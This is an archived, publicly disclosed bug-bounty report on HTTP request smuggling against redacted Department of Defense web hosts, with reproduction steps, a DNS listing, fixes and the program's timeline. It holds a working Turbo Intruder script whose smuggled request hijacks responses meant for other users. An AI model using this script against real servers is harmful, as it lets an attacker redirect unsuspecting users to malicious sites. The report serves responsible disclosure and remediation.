---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/http-request-smuggling
  - env/web
  - vuln/sql-injection
substate: "resolved"
weakness: "HTTP Request Smuggling"
enriched: true
body: true
date: 2019-10-08
submitted: 2019-04-04T14:55:55.466Z
bounty_usd: null
votes: 25
cve: []
program: "[[programs/deptofdefense|U.S. Dept Of Defense]]"
reporter: "albinowax"
source: "https://hackerone.com/reports/526880"
title: "Request smuggling on ████████"
---
# Request smuggling on ████████

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 25 | **Program:** U.S. Dept Of Defense | **Disclosed:** 2019-10-08

- Report: [https://hackerone.com/reports/526880](https://hackerone.com/reports/526880)
- CWE: HTTP Request Smuggling
- Submitted: 2019-04-04T14:55:55.466Z

## Report summary

I've posted a full writeup over at https://portswigger.net/blog/http-desync-attacks-request-smuggling-reborn

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

**Summary:**


**Description:**
The sites at █████████ and ww.██████████ are vulnerable to backend socket poisoning which enables attackers to hijack responses to other users.

This vulnerability occurs because the backend server regards` \n` as a valid header ending, whereas the backend only thinks `\r\n` is valid. This means it's possible to send requests that are interpreted differently by the two servers, leading to backend socket poisoning.

## Impact
Unauthenticated, remote attackers can randomly redirect active users to malicious websites, with no user-interaction required.

## Step-by-step Reproduction Instructions
To replicate this with minimal risk of affecting legitimate users we'll target stage.████████ instead of ██████████, and use the following turbo intruder script:

I've hard-coded the endpoint to ██████████ because it appears that you've got multiple endpoints for stage.█████████ and some are not vulnerable.
```
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint='https://██████████:443',
                           concurrentConnections=5,
                           requestsPerConnection=1,
                           pipeline=False,
                           maxRetriesPerRequest=0
                           )
    engine.start()    

    attack = '''POST /████ HTTP/1.1
Fooz: bar\nTransfer-Encoding: chunked
Host: stage.█████
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 77
Foo: bar

0

GET███████ HTTP/1.1
X: X'''

    engine.queue(attack)

    victim = '''GET /foo.jpg?x=%s HTTP/1.1
Host: stage.████████
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: keep-alive

'''
    for i in range(15):
        engine.queue(victim, i)
        time.sleep(0.2)


def handleResponse(req, interesting):
    table.add(req)

 ```
You should observe that one of the responses to a victim request is a 302 redirect to █████████

## Suggested Mitigation/Remediation Actions
When I resolve stage.███ I get a bunch of IP addresses, and only some of these appear to be vulnerable. As such, you should be able to resolve this issue by making these servers consistent:

```
stage.████████.		59	IN	A	██████████
stage.████.		59	IN	A	████████
stage.█████.		59	IN	A	██████
stage.███████.		59	IN	A	█████
stage.████.		59	IN	A	██████████
stage.██████████.		59	IN	A	█████
```

## Impact

Unauthenticated, remote attackers can randomly redirect active users to malicious websites, with no user-interaction required. Socket poisoning also enables a variety of other attacks which I haven't time to explore on your site.

## Timeline

- **Report Filed**
- **2019-04-04** @U.S. Dept Of Defense: Greetings from the Department of Defense (DoD),

Thank you for supporting the DoD Vulnerability Disclosure Program (VDP).

By submitting this report, you acknowledge understanding of, and agreement to, the DoD Vulnerability Disclosure Policy as detailed at @DeptofDefense.

The VDP Team will review your report to ensure compliance with the DoD Vulnerability Disclosure Policy.  If your report is determined to be out-of-scope, it will be closed without action.

We will attempt to validate in-scope vulnerability reports and may request additional information from you if necessary. We will forward reports with validated vulnerabilities to DoD system owners for their action.

Our goal is to provide you with status updates not less than every two weeks until the reported vulnerability is resolved.

Regards,

The VDP Team
- **Report Needs More Info**
- **Report New**
- **Report Severity Updated**
- **Report Triaged**
- **2019-06-27** @ag3nt-j1: @albinowax I'm working with the system owner to try and resolve the issue reported.  Do you have anything on hand that might help these folks remediate this?
- **2019-06-28** @albinowax: You could make the frontend reject or nomalise requests if a header contains `\n`. Or make it respect the RFC and treat `\n` as a valid header ending.

Or you could make the backend reject requests that specify both a `Content-Length` and `Transfer-Encoding: chunked`. When it rejects them, it should also close the connection.
- **Report Resolved**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
